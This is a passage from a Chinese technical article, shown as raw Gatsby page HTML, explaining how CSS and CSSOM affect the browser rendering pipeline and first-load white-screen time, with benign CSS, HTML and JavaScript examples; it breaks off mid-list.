href="#%E6%B8%B2%E6%9F%93%E6%B5%81%E6%B0%B4%E7%BA%BF%EF%BC%9Acss-%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E9%A6%96%E6%AC%A1%E5%8A%A0%E8%BD%BD%E6%97%B6%E7%9A%84%E7%99%BD%E5%B1%8F%E6%97%B6%E9%97%B4%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>渲染流水线：CSS 如何影响首次加载时的白屏时间？</h1>\n<p>在上一篇文章中我们详细介绍了 DOM 的生成过程，并结合具体例子分析了 JavaScript 是如何阻塞 DOM 生成的。那本文我们就继续深入聊聊渲染流水线中的 CSS。因为 CSS 是页面中非常重要的资源，它决定了页面最终显示出来的效果，并影响着用户对整个网站的第一体验。所以，搞清楚浏览器中的 CSS 是怎么工作的很有必要，只有理解了 CSS 是如何工作的，你才能更加深刻地理解如何去优化页面。</p>\n<p>本文我们先站在渲染流水线的视角来介绍 CSS 是如何工作的，然后通过 CSS 的工作流程来分析性能瓶颈，最后再来讨论如何减少首次加载时的白屏时间</p>\n<p>渲染流水线视角下的 CSS 我们先结合下面代码来看看最简单的渲染流程：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="76028914751264700000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`/* theme.css */\ndiv {\n  color: coral;\n  background-color: black;\n}`, `76028914751264700000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                css 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* theme.css */</span>\n<span class="token selector">div</span> <span class="token punctuation">{</span>\n  <span class="token property">color</span><span class="token punctuation">:</span> coral<span class="token punctuation">;</span>\n  <span class="token property">background-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="30838350815754190000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <head>\n    <link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot; />\n  </head>\n  <body>\n    <div>geekbang com</div>\n  </body>\n</html>`, `30838350815754190000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>theme.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>geekbang com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这两段代码分别由 CSS 文件和 HTML 文件构成，我们来分析下打开这段 HTML 文件时的渲染流水线，你可以先参考下面这张渲染流水线示意图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-50f04.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 51.031636863823934%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACDklEQVQoz23QW28SQRQH8P1+Ptg09tWXfgB98E16MT741NqobY3phesCKRRLUbFADQWtXIvIRS7ZOyx05bKw7MzuzLJuNUZjPPk9zPxzJjlnCNM08WyqiYLe72g3urDX1foi7HUsP6+ClcO+oPWsHsE6WAkUOTRTCFVVKqXGvReF5e3Kkf2UJndqu8vlzdvN3btt36sa6WzZV8obt2rPFr9s3bnaXPi6tVjfXqo9XVBaReL6u9Qolh3u1I7rMuk7ofx7tPPh1eFql1zhQ85WgOS8G+XD9YbrMe9epVxrjHuN9Txi7DaFqhLjmTqqluTQwTjsFIOOumc/7Hr70leNBVPCaz/t2087yD1P3ntUrIciUiQonh73IyEx5FPpNmHtDDrc9Xm0l4zLHxPSRSIYrXrjdOCs0b04B59i6fcZ8owiY0w+kZmmosNUfJSODz+8g6JAYISxgYy5riMVzY2ZrutwOkcK0hU8xwAbACgmmplYRVgDGMPfkGEQQ6mfbXYf+Fv33fU3Fb7A0SWB2U1yS8+/rYfZHENdtts5js/zfIHnfinyXJZlRFkmBlI/1+zYQpTtmDopUVm6bb0PFOkn4fpBmsqydIahswyTY//Is8xnmurKY8IaU0OabgCLooEJhLIKIIamqeE5VDRtarFCAP42BgAidPNh/9TcMCbyZDpVxqPxQJKGg8FEls3/1Q8Gy/hZqoeBqgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 17 57 26"\n        title=""\n        src="/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-fee1c.png"\n        srcset="/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-a67b7.png 200w,\n/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-0b187.png 400w,\n/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-fee1c.png 800w,\n/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-b1a91.png 1200w,\n/static/2021-07-12-17-57-26-5a2e57bfeb66dc5e650aaa43f5726f6d-50f04.png 1454w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>下面我们结合上图来分析这个页面文件的渲染流水线。</p>\n<p>首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。这里你需要特别注意下，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。</p>\n<p>上一篇文章中我们提到过，当渲染进程接收 HTML 文件字节流时，会先开启一个预解析线程，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间需要你注意一下，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。</p>\n<h2 id="那渲染流水线为什么需要-cssom-呢？"><a href="#%E9%82%A3%E6%B8%B2%E6%9F%93%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-cssom-%E5%91%A2%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>那渲染流水线为什么需要 CSSOM 呢？</h2>\n<p>和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，第一个是提供给 JavaScript 操作样式表的能力，第二个是为布局树的合成提供基础的样式信息。这个 CSSOM 体现在 DOM 中就是 document.styleSheets。具体结构你可以去查阅相关资料，这里我就不过多介绍了，你知道 CSSOM 的两个作用是怎样的就行了。</p>\n<p>有了 DOM 和 CSSOM，接下来就可以合成布局树了，我们在前面讲解过布局树的构造过程，这里咱们再简单回顾下。等 DOM 和 CSSOM 都构建好之后，渲染引擎就会构造布局树。布局树的结构基本上就是复制 DOM 树的结构，不同之处在于 DOM 树中那些不需要显示的元素会被过滤掉，如 display:none 属性的元素、head 标签、script 标签等。复制好基本的布局树结构之后，渲染引擎会为对应的 DOM 元素选择对应的样式信息，这个过程就是样式计算。样式计算完成之后，渲染引擎还需要计算布局树中每个元素对应的几何位置，这个过程就是计算布局。通过样式计算和计算布局就完成了最终布局树的构建。再之后，就该进行后续的绘制操作了。</p>\n<p>这就是在渲染过程中涉及到 CSS 的一些主要流程。</p>\n<p>了解了这些之后，我们再来看看稍微复杂一点的场景，还是看下面这段 HTML 代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="28236766449480830000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`/* theme.css */\ndiv {\n  color: coral;\n  background-color: black;\n}`, `28236766449480830000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                css 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* theme.css */</span>\n<span class="token selector">div</span> <span class="token punctuation">{</span>\n  <span class="token property">color</span><span class="token punctuation">:</span> coral<span class="token punctuation">;</span>\n  <span class="token property">background-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="39946002436416100000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <head>\n    <link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot; />\n  </head>\n  <body>\n    <div>geekbang com</div>\n    <script>\n      console.log(\'time.geekbang.org\');\n    </script>\n    <div>geekbang com</div>\n  </body>\n</html>`, `39946002436416100000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>theme.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>geekbang com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang.org\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>geekbang com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这段代码是我在开头代码的基础之上做了一点小修改，在 body 标签内部加了一个简单的 JavaScript。有了 JavaScript，渲染流水线就有点不一样了，可以参考下面这张渲染流水线图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-4674f.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 51.00942126514132%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB5ElEQVQoz4WRy2sTURTG5x9yoSAuBQkFQfeuBHeuBXGrG1GDZuGmICg0j06TSUjSxIzWlIKJ0iZtmmRMJo8mnek8msfkzr2dZCZzMzPe4Ktk4+F3DudwPjgHPsr7Xzhzy7Esz3WdqbGyokhONU3geLHRBnwDNiuA2wfcAWzUIM+NS99UNnW+kzn/kpXZpPo1P6kWJrUCqBWxgajZzCjtc/cDtQdva4UNuvvucd3v4wN3exsBiQl9f3hv++aVnds3PvmuZdeuZ3xXi09ulV+uNV7fmcptSjcMqVppJuJcItGkgz+C67ubsSOGGWxvdaLB4+D7z5u5NkNL8ZAUDyuJsJSMyKmImo7Mx8Pl20a/M0hvKZn45GM0H2Nf0fx6jGun06MMHaX3/LFOiCkPcskRmxwScr+xtRHlep5rW66hYTTCFxCMNagjBMAcguWoAR0gpCML6is4GFNTpJc7ytO08DzbP5TVuiLmW2ePwh0/K1Rk6ehMqCtSXZWrqnKZY0VGlkUZEBy0xGep3ovsSbF7cij0dvn+m1zrQ6FbFk9LwmlZFP40/ygJfWjOKJcY6Cw8z3Y928SYYDuYuOt6C2uBl2D8qzGxfRnHdakV303TRJAEgjq8QIigjcfDwYBUsiICcuyv+CfXVP9mI3tdLAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 17 58 30"\n        title=""\n        src="/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-fee1c.png"\n        srcset="/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-a67b7.png 200w,\n/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-0b187.png 400w,\n/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-fee1c.png 800w,\n/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-b1a91.png 1200w,\n/static/2021-07-12-17-58-30-036e446289655483317250b7e85b33d2-4674f.png 1486w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>那我们就结合这张图来分析含有外部 CSS 文件和 JavaScript 代码的页面渲染流水线，上一篇文章中我们提到过在解析 DOM 的过程中，如果遇到了 JavaScript 脚本，那么需要先暂停 DOM 解析去执行 JavaScript，因为 JavaScript 有可能会修改当前状态下的 DOM。</p>\n<p>不过在执行 JavaScript 脚本之前，如果页面中包含了外部 CSS 文件的引用，或者通过 style 标签内置了 CSS 内容，那么渲染引擎还需要将这些内容转换为 CSSOM，因为 JavaScript 有修改 CSSOM 的能力，所以在执行 JavaScript 之前，还需要依赖 CSSOM。也就是说 CSS 在部分情况下也会阻塞 DOM 的生成。</p>\n<p>我们再来看看更加复杂一点的情况，如果在 body 中被包含的是 JavaScript 外部引用文件，Demo 代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="20427134346007867000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`/* theme.css */\ndiv {\n  color: coral;\n  background-color: black;\n}`, `20427134346007867000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                css 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* theme.css */</span>\n<span class="token selector">div</span> <span class="token punctuation">{</span>\n  <span class="token property">color</span><span class="token punctuation">:</span> coral<span class="token punctuation">;</span>\n  <span class="token property">background-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="62177250624505390000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// foo.js\nconsole.log(\'time.geekbang.org\');`, `62177250624505390000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// foo.js</span>\nconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang.org\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="39769530402581070000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <head>\n    <link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot; />\n  </head>\n  <body>\n    <div>geekbang com</div>\n    <script src=&quot;foo.js&quot;></script>\n    <div>geekbang com</div>\n  </body>\n</html>`, `39769530402581070000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>theme.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>geekbang com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>foo.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>geekbang com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>从上面代码可以看出来，HTML 文件中包含了 CSS 的外部引用和 JavaScript 外部文件，那它们的渲染流水线是怎样的呢？可参考下图</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-b0cb8.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 52.156862745098046%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBElEQVQoz4WSa2vTYBSA959EEUFEPygy/Avqdz8I+gtkgrCBQ5hip7auWWVt2pV17tLhUOdqbzZpu/WSJs2l6TXJmzdtbk3apqaj+GFfPDzvgfMeHjgHzsL0fzExdGc8npimy6XWgvtMqACGk1lO52idrRls1c0aS7kopbycTUA8LWd/S1hmQJZVuqzWz4ZSdyYPh3oyWXq8ij9ZyxWQDWL9aXHlbvXtQx71NzY/HD24Eb9/7eje1ePF61/vXPn56GZmZbH46nb3h3cm9zWNw3LpLygW2SGCSOXzasb//iy0yaD+MrJ+6g1k/YFjH1ryeerIx8bWJ37b1wh6IJ6cyc50qlGVXjQgHUSlPfQA/f46TCPb5/Je8CQcXw4RGxHcEy6+C5eQaIHfj4HDWG83op7n5zs7tjnu9xxNthW504NYhSvXmImq6P2BW0J5AIEiiLCvqCaUh4o8hGBk6DNZ78NEtfNsi1o+ZHPNFsZzeZbwntSfh1h/ii+2mEKnlW838Waj2GnjF/xptzgFXsgDJUXwS7vE2rfaKUX+IskMTbzYqd1ayr+MEVmWTNSpBEW6rRRDu6QZ2v2pi+J8bM0yBE3sqhIjAxoAFvR2sfabeHe/0GHELikIlCjQQGIAoCXRxS0FVZ3L/2Jk27Zlje2RMxlNJ6YztkaWZRqGoetutizr0pH8BZLC/Hs6REFYAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 12 17 59 27"\n        title=""\n        src="/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-fee1c.png"\n        srcset="/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-a67b7.png 200w,\n/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-0b187.png 400w,\n/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-fee1c.png 800w,\n/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-b1a91.png 1200w,\n/static/2021-07-12-17-59-27-6c8864e1ea1f4a83f737f9120b693cd1-b0cb8.png 1530w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出来，在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。</p>\n<p>后面的流水线就和前面是一样的了，不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。</p>\n<h2 id="影响页面展示的因素以及优化策略"><a href="#%E5%BD%B1%E5%93%8D%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E7%9A%84%E5%9B%A0%E7%B4%A0%E4%BB%A5%E5%8F%8A%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>影响页面展示的因素以及优化策略</h2>\n<p>前面我们为什么要花这么多文字来分析渲染流水线呢？主要原因就是渲染流水线影响到了首次页面展示的速度，而首次页面展示的速度又直接影响到了用户体验，所以我们分析渲染流水线的目的就是为了找出一些影响到首屏展示的因素，然后再基于这些因素做一些针对性的调整。</p>\n<p>那么接下来我们就来看看从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段。</p>\n<ul>\n<li>第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。</li>\n<li>第二个阶段，提交数据之后渲染进程会创建一个空白页面，我们通常把这段时间称为解析白屏，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 